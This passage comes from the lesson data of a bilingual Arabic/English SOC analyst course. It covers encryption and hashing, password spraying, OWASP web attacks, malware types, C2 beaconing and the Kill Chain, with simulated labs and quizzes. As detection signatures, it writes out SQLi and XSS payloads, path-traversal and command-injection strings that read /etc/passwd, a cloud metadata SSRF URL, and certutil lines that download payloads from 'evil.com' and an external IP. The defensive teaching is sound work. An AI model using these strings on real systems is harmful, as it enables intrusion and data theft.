    <button class="btn-cmd" onclick="runSimCommand('Get-WinEvent -FilterHashtable @{LogName=\'Security\'; Id=4769} | select -First 1', 'standalone-term-body'); app.showToast('تم فحص سجلات تذاكر كيربيروس 4769', 'info');">فحص سجلات طلبات تذاكر الخدمات 4769</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هو المؤشر الأمني الأبرز في حدث Event ID 4769 على خادم الـ DC الذي يدق ناقوس الخطر بوقوع هجوم Kerberoasting؟",
          questionEn: "What is the primary indicator of Kerberoasting in Event ID 4769?",
          optionsAr: [
            "طلب تذكرة خدمة TGS باستخدام نوع تشفير قديم وهش وهو `0x17` (RC4-HMAC) بدلاً من تشفير AES القياسي لتسهيل كسرها بالـ GPU",
            "تغيير اسم حاسوب المستخدم",
            "انقطاع التيار الكهربائي عن خادم الدومين",
            "تحديث المتصفح لنسخة أحدث"
          ],
          optionsEn: [
            "Requesting a TGS ticket using the legacy weak encryption cipher 0x17 (RC4-HMAC) instead of AES to ease offline cracking",
            "Renaming the computer",
            "Power outage on DC",
            "Browser updated"
          ],
          correctIndex: 0,
          explanationAr: "تطلب أدوات الهجوم مثل Rubeus و Impacket تذاكر مشفرة بخوارزمية RC4 (الكود الست عشري `0x17`) عمداً لأن كسر هاشات RC4 بكرت الشاشة عبر أداة Hashcat أسرع بآلاف المرات من محاولة كسر تشفير AES المعقد."
        }
      }
    ]
  },
  {
    id: "course-5",
    courseNumber: 5,
    level: "intermediate",
    levelNameAr: "المستوى الثاني: متوسط",
    levelNameEn: "Level 2: Intermediate",
    levelBadgeColor: "#06B6D4",
    titleAr: "تشريح الهجمات السيبرانية وأطر العمل العالمية",
    titleEn: "Cyber Attacks Anatomy & Global Frameworks (Kill Chain & MITRE ATT&CK)",
    summaryAr: "علم تشريح الهجمات: مثلث CIA، التشفير والهاشات والترميز، الفرق في السجلات بين Brute Force و Password Spraying، هجمات الويب OWASP ورفع قذائف الويب، البرمجيات الخبيثة واتصالات القيادة والسيطرة C2، والإتقان الكامل لنموذج Cyber Kill Chain ومصفوفة MITRE ATT&CK.",
    summaryEn: "Attack anatomy: CIA Triad, Cryptography, Password attacks, OWASP Web attacks, Malware taxonomy, C2 Beaconing, Cyber Kill Chain, and 14 Tactics of MITRE ATT&CK.",
    icon: "🎯",
    duration: "9 ساعات تدريبية",
    lessonsCount: 8,
    badgeAr: "محلل التهديدات وأطر العمل",
    badgeEn: "Threat Analysis Specialist",
    lessons: [
      {
        id: "lesson-5-1",
        courseId: "course-5",
        number: "5.1",
        titleAr: "مثلث الحماية (CIA Triad)، مفاهيم (AAA)، التشفير (Symmetric vs Asymmetric)، الـ Hashing (MD5, SHA1, SHA256)، والـ Encoding (Base64, Hex, URL)",
        titleEn: "Security Foundations: CIA Triad, AAA, Encryption (Symmetric/Asymmetric), Hashing & Encoding",
        duration: "50 min",
        theoryAr: `
<h3>المبادئ التأسيسية للأمن السيبراني: الفرق الصارم بين التشفير، الهاش، والترميز</h3>
<p class="lead">يخلط المبتدئون دائماً بين التشفير والهاش والترميز، بينما يدرك محلل الـ SOC أن كل مفهوم يخدم غرضاً دفاعياً مختلفاً جذرياً؛ التشفير لحفظ السرية، الهاش لحفظ النزاهة، والترميز لنقل البيانات بأمان.</p>

<h4>1. مثلث الحماية الكلاسيكي (The CIA Triad)</h4>
<ul>
  <li><strong>السرية (Confidentiality):</strong> ضمان ألا يطلع على البيانات إلا المصرح لهم فقط (يتحقق عبر التشفير والصلاحيات).</li>
  <li><strong>النزاهة (Integrity):</strong> ضمان عدم تعديل أو تزوير البيانات أثناء التخزين أو النقل (يتحقق عبر الهاش والتوقيع الرقمي).</li>
  <li><strong>التوافر (Availability):</strong> ضمان وصول المستخدمين المصرح لهم للخدمة والبيانات في أي وقت (تستهدفه هجمات حجب الخدمة DDoS).</li>
</ul>

<h4>2. نموذج الـ AAA (Authentication, Authorization, Accounting)</h4>
<p>ركيزة الوصول الأمني: <strong>إثبات الهوية (Authentication)</strong> مثل كتابة كلمة السر، يليه <strong>منح الصلاحية (Authorization)</strong> لتحديد ما يحق لك فعله، يليه <strong>المحاسبة والمساءلة (Accounting)</strong> عبر السجلات لتسجيل كل ما قمت به بدقة.</p>

<h4>3. التشفير (Encryption) vs الهاش (Hashing) vs الترميز (Encoding)</h4>
<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>المفهوم</th>
        <th>طبيعة العملية</th>
        <th>هل يمكن استرجاع النص الأصلي؟</th>
        <th>أشهر الخوارزميات</th>
        <th>الاستخدام في الـ SOC</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>التشفير المتناظر (Symmetric)</strong></td>
        <td>استخدام مفتاح سري واحد للتشفير وفك التشفير.</td>
        <td>نعم، باستخدام نفس المفتاح.</td>
        <td>AES-128, AES-256</td>
        <td>تشفير الأقراص (BitLocker) واتصالات VPN.</td>
      </tr>
      <tr>
        <td><strong>التشفير غير المتناظر (Asymmetric)</strong></td>
        <td>استخدام زوج من المفاتيح: مفتاح عام (Public) للتشفير، ومفتاح خاص (Private) للفك.</td>
        <td>نعم، بالمفتاح الخاص المقابل فقط.</td>
        <td>RSA, ECC</td>
        <td>شهادات الويب SSL/TLS وتوقيع الشهادات.</td>
      </tr>
      <tr>
        <td><strong>الهاش (Hashing)</strong></td>
        <td>دالة رياضية أحادية الاتجاه (One-Way) تحول أي مدخل إلى بصمة فريدة ثابتة الطول.</td>
        <td>مستحيل رياضياً (لا يوجد فك للهاش).</td>
        <td>MD5, SHA-1, SHA-256</td>
        <td>بصمات البرمجيات الخبيثة (Malware Hashes) وتأكيد سلامة الأدلة الجنائية.</td>
      </tr>
      <tr>
        <td><strong>الترميز (Encoding)</strong></td>
        <td>تحويل شكل البيانات لضمان انتقالها عبر البروتوكولات النصية دون تلف.</td>
        <td>نعم وبسهولة (لا يحتاج لأي مفتاح أو سرية!).</td>
        <td>Base64, Hex, URL Encoding</td>
        <td>إخفاء الأوامر الخبيثة ونقل المرفقات في البريد.</td>
      </tr>
    </tbody>
  </table>
</div>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي حساب بصمات الملفات (File Integrity Hash Calculator)</span>
    <h4>حساب هاش SHA-256 لعينة برمجية خبيثة للتحقق من سلامتها</h4>
  </div>
  <p>شاهد توليد بصمة الهاش الرقمية الفريدة للملف:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> hash-calculator</div>
    <pre class="terminal-code">PS C:\> Get-FileHash -Algorithm SHA256 .\suspicious_sample.exe
Algorithm       Hash                                                             Path
---------       ----                                                             ----
SHA256          275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f  C:\suspicious_sample.exe
[INFO] SHA-256 Hash ready for Threat Intel lookup on VirusTotal.</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('Get-FileHash -Algorithm SHA256 calc.exe', 'standalone-term-body'); app.showToast('تم حساب هاش SHA-256', 'info');">حساب هاش SHA-256 لملف النظام</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هو الفارق الجوهري الحاسم بين تشفير البيانات بـ AES وبين ترميزها بصيغة Base64؟",
          questionEn: "What is the critical distinction between AES encryption and Base64 encoding?",
          optionsAr: [
            "تشفير AES يحمي سرية البيانات ولا يمكن فكه إلا بامتلاك المفتاح السري، بينما ترميز Base64 ليس تشفيراً على الإطلاق ويمكن لأي شخص فكه فوراً دون أي مفتاح",
            "Base64 أكثر أماناً من AES بمليون مرة",
            "AES مخصص للأجهزة القديمة فقط بينما Base64 للحديثة",
            "لا يوجد أي فرق بينهما؛ كلاهما ألعاب كمبيوتر"
          ],
          optionsEn: [
            "AES secures confidentiality requiring a secret key to decrypt, whereas Base64 is merely a public reversible representation with zero secrecy",
            "Base64 is a million times more secure than AES",
            "AES is for legacy systems only",
            "There is no difference"
          ],
          correctIndex: 0,
          explanationAr: "الترميز (Encoding) كـ Base64 لا يوفر أي خصوصية أو أمان لأنه خوارزمية علنية مصممة لتوافق نقل البيانات فقط؛ بينما التشفير الحقيقي (Encryption) كـ AES يستحيل فكه دون المفتاح الرياضي السري."
        }
      },
      {
        id: "lesson-5-2",
        courseId: "course-5",
        number: "5.2",
        titleAr: "تشريح هجمات كلمات المرور: الفرق في السجلات بين Brute Force, Password Spraying, و Credential Stuffing",
        titleEn: "Password Attacks Forensic Breakdown: Brute Force vs Password Spraying vs Credential Stuffing",
        duration: "50 min",
        theoryAr: `
<h3>معركة الهوية: كيف تميز بين أنماط كسر كلمات المرور الثلاثة في سجلات الـ SIEM؟</h3>
<p class="lead">لا تحدث هجمات المصادقة بنفس الطريقة؛ فهم الفارق المجهري بينها في سجلات الدخول (Event ID 4625) يحمي حسابات المؤسسة من الإغلاق الجماعي ويسرع كشف الهجمات المنسقة.</p>

<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>نوع الهجوم</th>
        <th>آلية التنفيذ التكتيكية</th>
        <th>الشكل النمطي في السجلات (Event 4625)</th>
        <th>هل يسبب إغلاق الحسابات (Account Lockout)؟</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>التخمين المباشر (Brute Force)</strong></td>
        <td>استهداف حساب واحد محدد (مثل <code>admin</code>) وتجربة آلاف أو ملايين كلمات المرور عليه بسرعة عالية.</td>
        <td>آلاف محاولات الدخول الفاشلة المتتالية <strong>لنفس الحساب الواحد</strong> في ثوانٍ معدودة.</td>
        <td>نعم فوراً؛ يتم إغلاق الحساب المستهدف بعد 3 إلى 5 محاولات فاشلة وفق سياسة الأمان.</td>
      </tr>
      <tr>
        <td><strong>رش كلمات المرور (Password Spraying)</strong></td>
        <td>التخفي بذكاء: تجربة كلمة سر واحدة شائعة جداً (مثل <code>Winter2026!</code>) على آلاف الحسابات المختلفة بالشركة ببطء وتأنٍ!</td>
        <td>محاولة فاشلة <strong>واحدة فقط لكل مستخدم</strong> عبر مئات المستخدمين المتنوعين في نفس الساعة.</td>
        <td>لا؛ يتحايل بذكاء على سياسات إغلاق الحسابات لأن كل مستخدم يفشل مرة واحدة فقط فلا يتجاوز الحد!</td>
      </tr>
      <tr>
        <td><strong>حشو بيانات الاعتماد (Credential Stuffing)</strong></td>
        <td>استخدام قواعد بيانات مسربة من مواقع أخرى (مثل تسريبات LinkedIn أو Adobe) وتجربة نفس الإيميلات وكلمات السر على بوابات الشركة.</td>
        <td>محاولات دخول من عناوين IP موزعة جغرافياً (عبر شبكات Botnets أو Tor) لأسماء مستخدمين مختلفة.</td>
        <td>يعتمد على نسبة تطابق كلمات المرور القديمة مع الجديدة.</td>
      </tr>
    </tbody>
  </table>
</div>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي كشف هجوم Password Spraying (Splunk Detection Query)</span>
    <h4>تحليل استعلام SIEM يكشف هجوم رش كلمات المرور المتخفي</h4>
  </div>
  <p>شاهد استعلام Splunk لاكتشاف النمط الشاذ لمحاولات الدخول الفاشلة عبر عدة مستخدمين:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> splunk-spraying-search</div>
    <pre class="terminal-code">index=windows EventCode=4625
| stats dc(TargetUserName) as distinct_users, count by src_ip
| where distinct_users > 20 AND count / distinct_users < 2
----------------------------------------------------------------------
src_ip: 185.220.101.44 | distinct_users: 142 | total_attempts: 142
[CRITICAL ALERT] Password Spraying Pattern Confirmed: Exactly 1 failed attempt against 142 unique users from single external IP!</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "لماذا يعد هجوم 'رش كلمات المرور' (Password Spraying) أكثر خطورة وأصعب في الاكتشاف من هجوم التخمين المباشر (Brute Force)؟",
          questionEn: "Why is Password Spraying harder to detect than brute force?",
          optionsAr: [
            "لأنه يجرب كلمة مرور واحدة على مئات المستخدمين المختلفين ببطء، مما يتفادى تفعيل سياسة إغلاق الحسابات (Account Lockout Policy) ولا يثير تنبيهات التخمين التقليدية",
            "لأنه لا يترك أي سجلات في نظام ويندوز إطلاقاً",
            "لأنه يعمل بدون اتصال بالإنترنت",
            "لأنه يغير نظام تشغيل الخادم بالكامل"
          ],
          optionsEn: [
            "It tests one common password across hundreds of unique users, bypassing account lockout thresholds and traditional alert triggers",
            "Leaves zero logs",
            "Works without internet",
            "Changes OS"
          ],
          correctIndex: 0,
          explanationAr: "هجوم Password Spraying مصمم خصيصاً للالتفاف على سياسات إغلاق الحسابات (Lockout Policies)؛ فبدلاً من استهداف حساب واحد حتى يُقفل، يوزع المحاولات على كافة موظفي الشركة بكلمة سر واحدة محتملة."
        }
      },
      {
        id: "lesson-5-3",
        courseId: "course-5",
        number: "5.3",
        titleAr: "تشريح هجمات الويب (OWASP Top 10) وكيف نكشفها في الـ Logs: (SQL Injection, XSS, Command Injection, Path Traversal / LFI & RFI, SSRF, File Upload & Web Shells)",
        titleEn: "OWASP Top 10 Web Attacks & Log Forensics: SQLi, XSS, Command Injection, LFI, SSRF & Web Shells",
        duration: "55 min",
        theoryAr: `
<h3>بوابات الدخول الأمامية: تشريح أخطر هجمات تطبيقات الويب في سجلات الخوادم</h3>
<p class="lead">تعتبر تطبيقات الويب الواجهة الأكثر تعرضاً للهجمات في العالم؛ يصدر مشروع OWASP العالمي تقريراً بأخطر 10 ثغرات ويب. يتعلم محلل الـ SOC في هذا الدرس بصمات هذه الهجمات في سجلات سيرفرات Apache و Nginx و WAF.</p>

<h4>1. حقن أوامر قواعد البيانات (SQL Injection - SQLi)</h4>
<p>حقن نصوص برمجية خاصة بـ SQL في مدخلات المستخدم للتحايل على استعلامات قاعدة البيانات وسرقة الجداول.</p>
<p><strong>بصمته في السجلات:</strong> رموز <code>' OR 1=1 --</code>، <code>UNION SELECT</code>، أو دوال التأخير الزمني <code>WAITFOR DELAY '0:0:5'</code>.</p>

<h4>2. حقن الأكواد البرمجية للواجهة (Cross-Site Scripting - XSS)</h4>
<p>حقن شفرات JavaScript خبيثة داخل صفحات الموقع لتعمل في متصفحات الزوار الآخرين وسرقة ملفات الـ Cookies وجلسات الدخول.</p>
<p><strong>بصمته في السجلات:</strong> وسوم الـ HTML والسكريبتات مثل: <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> أو <code>&lt;img src=x onerror=...&gt;</code>.</p>

<h4>3. حقن أوامر نظام التشغيل (Command Injection / RCE)</h4>
<p>استغلال وظائف في التطبيق تتخاطب مع سطر أوامر السيرفر (مثل وظيفة فحص الاتصال Ping) وحقن رموز دمج الأوامر في لينكس/ويندوز: <code>;</code> أو <code>|</code> أو <code>&amp;&amp;</code> (مثل: <code>127.0.0.1; cat /etc/passwd</code>).</p>

<h4>4. اختراق المسارات واستدعاء الملفات (Path Traversal / LFI)</h4>
<p>التسلل خارج مجلد الويب العام لقراءة ملفات النظام الحساسة باستخدام متوالية الصعود للأعلى: <code>../../../../etc/passwd</code> أو <code>..\\..\\windows\\win.ini</code>.</p>

<h4>5. تزوير الطلبات من جانب الخادم (SSRF - Server-Side Request Forgery)</h4>
<p>إجبار خادم الويب على إرسال طلبات داخلية نيابة عن المهاجم للوصول لخدمات سحابية سرية غير متاحة للعامة (مثل استدعاء واجهة بيانات الميتا السحابية AWS Metadata: <code>http://169.254.169.254/latest/meta-data/</code>).</p>

<h4>6. رفع الملفات الخبيثة وقذائف الويب (Malicious File Upload & Web Shells)</h4>
<p>رفع ملف سكربت تنفيذي (مثل <code>backdoor.php</code> أو <code>shell.aspx</code>) متنكراً بصيغة صورة بريئة (مثل <code>shell.php.jpg</code>) لتنفيذ قذيفة تحكم كاملة في السيرفر.</p>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي تشريح سجلات خادم الويب (Web Log Forensics)</span>
    <h4>كشف بصمات هجوم Path Traversal ورفع Web Shell في سجلات Nginx</h4>
  </div>
  <p>تفحص تدفق الطلبات المستخرجة من <code>access.log</code>:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> web-access-log</div>
    <pre class="terminal-code">198.51.100.12 - - [07/Nov/2026:05:14:02] "GET /view.php?file=../../../../etc/shadow HTTP/1.1" 403 162
198.51.100.12 - - [07/Nov/2026:05:14:22] "POST /uploads/avatar.php HTTP/1.1" 200 4512  <-- SUSPICIOUS PHP IN UPLOADS!
198.51.100.12 - - [07/Nov/2026:05:14:35] "GET /uploads/avatar.php?cmd=whoami HTTP/1.1" 200 48  <-- WEB SHELL EXECUTION!
[CRITICAL ALERT] Web Shell active execution detected under /uploads/ directory returning HTTP 200!</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('grep \"cmd=\" /var/log/nginx/access.log', 'standalone-term-body'); app.showToast('تم فحص سجلات أوامر الـ Web Shell', 'info');">فحص سجلات استدعاء أوامر الويب شيل</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "في سجلات خادم الويب Nginx، ما الذي يشير إليه وجود طلب بالصيغة التالية: `GET /uploads/profile.php?cmd=cat%20/etc/passwd` مصحوباً بكود حالة `200 OK`؟",
          questionEn: "What does GET /uploads/profile.php?cmd=cat /etc/passwd with 200 OK indicate?",
          optionsAr: [
            "نجاح المهاجم في رفع قذيفة ويب (Web Shell) داخل مجلد التحميلات وتنفيذ أوامر قراءة ملف المستخدمين الحساس مباشرة على السيرفر",
            "المستخدم يقوم بتغيير صورته الشخصية بشكل طبيعي",
            "تحديث تلقائي لقاعدة بيانات ووردبريس",
            "خطأ برمجي في شاشة المستخدم"
          ],
          optionsEn: [
            "Successful web shell deployment in /uploads/ actively executing commands to exfiltrate /etc/passwd",
            "Normal user avatar update",
            "WordPress update",
            "Display glitch"
          ],
          correctIndex: 0,
          explanationAr: "وجود ملف PHP داخل مجلد التحميلات العامة (uploads) مع تمرير وسيط أوامر (`cmd=`) وتلقي كود 200 OK يدل بشكل قاطع على اختراق ناجح ورفع Web Shell ينفذ أوامر النظام."
        }
      },
      {
        id: "lesson-5-4",
        courseId: "course-5",
        number: "5.4",
        titleAr: "تشريح البرمجيات الخبيثة (Malware Analysis Basics): (Virus, Worm, Trojan, Ransomware, Spyware, Rootkit, Fileless Malware, Living off the Land - LOLBins)",
        titleEn: "Malware Taxonomy & LOLBins: Virus, Worm, Ransomware, Rootkits, Fileless & Living off the Land",
        duration: "55 min",
        theoryAr: `
<h3>تصنيف الكائنات البرمجية الخبيثة: علم الأحياء السيبراني للمحلل الأمني</h3>
<p class="lead">لا تسمى كل برمجية خبيثة "فيروساً"؛ ففي علم الأمن السيبراني الاحترافي، يُصنف المالوير بدقة بناءً على آلية انتشاره وسلوكه التخريبي والهدف منه.</p>

<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>النوع</th>
        <th>آلية العمل والانتشار</th>
        <th>أشهر الأمثلة في التاريخ</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>الفيروس (Virus)</strong></td>
        <td>يلحق نفسه بملف تنفيذي شرعي بريء وينتظر قيام المستخدم بتشغيله ليتكاثر.</td>
        <td>CIH, ILOVEYOU</td>
      </tr>
      <tr>
        <td><strong>الدودة (Worm)</strong></td>
        <td>أخطر في الانتشار؛ تنتشر ذاتياً عبر ثغرات الشبكة دون أي تدخل بشري!</td>
        <td>WannaCry (استغلت ثغرة EternalBlue عبر SMB 445), Conficker</td>
      </tr>
      <tr>
        <td><strong>حصان طروادة (Trojan)</strong></td>
        <td>يتظاهر بأنه برنامج مفيد ومرغوب (مثل لعبة أو كراك أو تحديث مزيف) ليخدع المستخدم بتشغيله بينما يفتح باباً خلفياً خفياً (Backdoor).</td>
        <td>Emotet, Agent Tesla</td>
      </tr>
      <tr>
        <td><strong>برمجيات الفدية (Ransomware)</strong></td>
        <td>تقوم بتشفير جميع ملفات القرص بخوارزمية قوية (AES+RSA) وتطلب فدية بعملة البيتكوين مقابل مفتاح فك التشفير.</td>
        <td>LockBit, BlackCat (ALPHV), Ryuk</td>
      </tr>
      <tr>
        <td><strong>الجذر الخفي (Rootkit)</strong></td>
        <td>تغرس نفسها داخل نواة النظام (Kernel Ring 0) وتعدل دوال النظام لإخفاء العمليات والملفات والاتصالات عن برامج الحماية.</td>
        <td>Stuxnet, Flame</td>
      </tr>
      <tr>
        <td><strong>المالوير الخالي من الملفات (Fileless Malware)</strong></td>
        <td>لا يكتب أي ملف تنفيذي على القرص الصلب لتفادي الـ Antivirus التقليدي؛ بل يعمل مباشرة في الذاكرة العشوائية RAM.</td>
        <td>PowerSploit, Cobalt Strike Beacons</td>
      </tr>
      <tr>
        <td><strong>العيش على موارد الأرض (LOLBins)</strong></td>
        <td>استخدام أدوات النظام الشرعية المثبتة مسبقاً في ويندوز (مثل <code>certutil.exe</code>, <code>bitsadmin.exe</code>, <code>powershell.exe</code>) لتنزيل وتشغيل المالوير دون إطلاق تحذيرات الحماية.</td>
        <td>Certutil لتنزيل الملفات: <code>certutil -urlcache -split -f http://evil.com/payload.exe</code></td>
      </tr>
    </tbody>
  </table>
</div>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي كشف استغلال أدوات النظام الشرعية (LOLBins Detector)</span>
    <h4>كشف استخدام أداة Certutil الشرعية لتنزيل حمولة خبيثة</h4>
  </div>
  <p>تفحص سطر الأوامر الملتقط في حدث Sysmon Event ID 1:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> lolbins-monitor</div>
    <pre class="terminal-code">Image: C:\Windows\System32\certutil.exe  <-- LEGITIMATE SIGNED MICROSOFT BINARY!
CommandLine: certutil.exe -urlcache -split -f "http://185.220.101.5/beacon.dll" C:\Users\Public\beacon.dll
ParentImage: C:\Windows\System32\cmd.exe
[ALERT] Living off the Land Binary (LOLBin) certutil.exe abused for malicious file download!</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('certutil -urlcache -split -f', 'standalone-term-body'); app.showToast('تم محاكاة فحص مسار certutil', 'info');">فحص سلوك Certutil في المحاكي</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هو الفارق الجوهري في آلية الانتشار بين فيروس الحاسوب (Virus) ودودة الحاسوب (Worm)؟",
          questionEn: "What is the key difference in spreading between a Virus and a Worm?",
          optionsAr: [
            "الفيروس يحتاج لتفاعل بشري وتشغيل ملف مضيف لكي ينتشر، بينما الدودة تنتشر ذاتياً وتلقائياً عبر ثغرات الشبكة دون أي تدخل بشري",
            "الفيروس يهاجم الشاشات فقط بينما الدودة تهاجم لوحة المفاتيح",
            "لا يوجد أي فرق؛ الكلمتان مترادفتان تماماً",
            "الدودة برنامج حماية معتمد من مايكروسوفت"
          ],
          optionsEn: [
            "A virus requires human execution of an infected host file, while a worm self-propagates automatically over network vulnerabilities without human intervention",
            "Virus attacks monitors, worm attacks keyboards",
            "Exact synonyms",
            "Worm is a Microsoft antivirus"
          ],
          correctIndex: 0,
          explanationAr: "تتميز ديدان الشبكة (مثل WannaCry) بقدرتها على مسح الشبكة تلقائياً واختراق الأجهزة المصابة دون انتظار قيام أي موظف بالنقر على ملف، بخلاف الفيروس التقليدي الذي يشترط تشغيل الملف المصاب."
        }
      },
      {
        id: "lesson-5-5",
        courseId: "course-5",
        number: "5.5",
        titleAr: "اتصالات القيادة والسيطرة (C2 - Command & Control): كيف يتصل المالوير بالسيرفر الخارجي؟ (Beaconing, DNS Tunneling, Domain Generation Algorithms - DGA, Cobalt Strike)",
        titleEn: "Command & Control (C2) Architecture: Beaconing Traffic, DGA Algorithms & Cobalt Strike Forensics",
        duration: "55 min",
        theoryAr: `
<h3>حبل المشيمة الرقمي: تشريح قنوات اتصال المهاجمين بأجهزتهم المخترقة</h3>
<p class="lead">بمجرد تثبيت المالوير، يحتاج المهاجم لإرسال الأوامر له واستقبال البيانات المسروقة؛ هذا الاتصال يسمى قناة القيادة والسيطرة (C2 Channel). كشف هذه القنوات هو الاختبار الحقيقي لحنكة محلل الـ SOC.</p>

<h4>1. نبضات الإشارة الدورية (C2 Beaconing Traffic)</h4>
<p>يتصل المالوير بسيرفر الهكر الخارجي على فترات زمنية محددة أو شبه دورية طلباً لأوامر جديدة (مثل الاتصال كل 60 ثانية). للكشف عنها، يبحث محلل الـ SOC في سجلات الفايروول والـ Proxy عن <strong>اتصالات منتظمة ومتكررة (High Periodicity / Jitter)</strong> بنفس حجم الحزمة تقريباً ونفس الوجهة الخارجية.</p>

<h4>2. خوارزميات توليد النطاقات التلقائية (DGA - Domain Generation Algorithms)</h4>
<p>لتفادي حظر عناوين الـ IP أو أسماء النطاقات، يقوم مطورو المالوير ببرمجة خوارزمية DGA تولد يومياً مئات أسماء النطاقات العشوائية (مثل: <code>xkp92bfql01.com</code>) بناءً على التاريخ الحالي. يقوم المالوير بمحاولة الاتصال بها جميعاً، ويسجل المهاجم نطاقاً واحداً منها فقط ليتلقى الاتصال، مما يجعل حظر النطاقات مستحيلاً بالطرق التقليدية!</p>
<p><strong>علامة الكشف في الـ SOC:</strong> رصد آلاف استعلامات الـ DNS التي تفشل وتعود بكود <code>NXDOMAIN</code> لنطاقات غير مفهومة وعشوائية الحروف.</p>

<h4>3. منصة Cobalt Strike وسحر الـ Malleable C2 Profiles</h4>
<p>أشهر منصة اختراق ومحاكاة تهديدات في العالم؛ تستخدم وكيلها المسمى <strong>Beacon</strong> الذي يتميز بقدرته على تمويه حزم الاتصال لتطابق ترافيك مواقع مشهورة (مثل جعل الترافيك الخبيث يبدو تماماً كطلب بحث في Google أو استماع لأغنية على Spotify!).</p>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي كشف نبضات C2 Beaconing (Network Traffic Forensics)</span>
    <h4>تحليل الفترات الزمنية للاتصالات الخارجية لكشف النبض الدوري</h4>
  </div>
  <p>تفحص جدول الاتصالات الصادرة من جهاز موظف نحو عنوان IP مشبوه:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> c2-beacon-analyzer</div>
    <pre class="terminal-code">Timestamp             Source Host   Dest IP         Bytes   Delta Time
2026-11-07 05:00:00   10.0.1.15     194.87.12.9     512 B   --
2026-11-07 05:01:02   10.0.1.15     194.87.12.9     512 B   ~62 seconds
2026-11-07 05:02:01   10.0.1.15     194.87.12.9     512 B   ~59 seconds
2026-11-07 05:03:03   10.0.1.15     194.87.12.9     512 B   ~62 seconds
[CRITICAL ALERT] C2 Beaconing Pattern Confirmed: Constant 60s periodicity with 5% Jitter detected!</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هو المؤشر الأبرز في سجلات استعلامات الـ DNS الذي يدل على وجود برمجية خبيثة تستخدم خوارزمية DGA (Domain Generation Algorithm)؟",
          questionEn: "What key DNS indicator points to a DGA-based malware?",
          optionsAr: [
            "ظهور آلاف الاستعلامات لنطاقات عشوائية غير مفهومة تعود جميعها برسالة خطأ NXDOMAIN (Non-Existent Domain)",
            "استعلام المستخدم عن موقع الطقس المحلي",
            "انقطاع الكهرباء عن شاشة الحاسوب",
            "تحميل ملف PDF بحجم 1 ميجابايت"
          ],
          optionsEn: [
            "A spike in queries for pseudo-random gibberish domains returning NXDOMAIN (Non-Existent Domain)",
            "Local weather lookup",
            "Monitor power failure",
            "Downloading a 1MB PDF"
          ],
          correctIndex: 0,
          explanationAr: "تولد خوارزميات الـ DGA مئات النطاقات الوهمية التي لا وجود لها على الإنترنت في الحقيقة، فتفشل معظم الاستعلامات وتعود بسجل NXDOMAIN، ويعد تدفق هذه السجلات دليلاً قاطعاً على نشاط DGA."
        }
      },
      {
        id: "lesson-5-6",
        courseId: "course-5",
        number: "5.6",
        titleAr: "إطار Cyber Kill Chain (المراحل الـ 7 للهجوم) ونموذج Diamond Model of Intrusion Analysis",
        titleEn: "Cyber Kill Chain (7 Phases) & The Diamond Model of Intrusion Analysis",
        duration: "50 min",
        theoryAr: `
<h3>خرائط التتبع الاستراتيجي: كيف تكسر سلسلة الهجوم قبل اكتمال الهدف؟</h3>
<p class="lead">لا يحدث أي هجوم سيبراني معقد كضربة حظ عشوائية؛ بل يتبع المهاجمون مساراً متسلسلاً خطوة بخطوة. وضع عمالقة الدفاع السيبراني نموذجين عالميين لتحليل وتفكيك أي اختراق.</p>

<h4>1. سلسلة القتل السيبراني من لوكهيد مارتن (Lockheed Martin Cyber Kill Chain)</h4>
<ol>
  <li><strong>1. الاستطلاع (Reconnaissance):</strong> جمع المعلومات عن الهدف (الموظفين، النطاقات، التقنيات المستخدمة عبر OSINT).</li>
  <li><strong>2. التسلح (Weaponization):</strong> دمج البرمجية الخبيثة مع ملف استغلال (مثل إرفاق ماكرو خبيث بملف Word أو PDF).</li>
  <li><strong>3. الإيصال (Delivery):</strong> إرسال السلاح للهدف (مثل إرسال إيميل تصيد احتيالي Phishing Email).</li>
  <li><strong>4. الاستغلال (Exploitation):</strong> فتح الضحية للملف وتشغيل الكود واستغلال ثغرة في التطبيق.</li>
  <li><strong>5. التثبيت (Installation):</strong> تثبيت الباب الخلفي (Backdoor) أو آليات البقاء في الريجستري والمهام المجدولة.</li>
  <li><strong>6. القيادة والسيطرة (Command & Control - C2):</strong> فتح قناة اتصال مشفرة مع خادم الهكر الخارجي.</li>
  <li><strong>7. الإجراءات على الأهداف (Actions on Objectives):</strong> تحقيق الهدف النهائي (سرقة البيانات Exfiltration، أو تشفير الأجهزة بالفدية).</li>
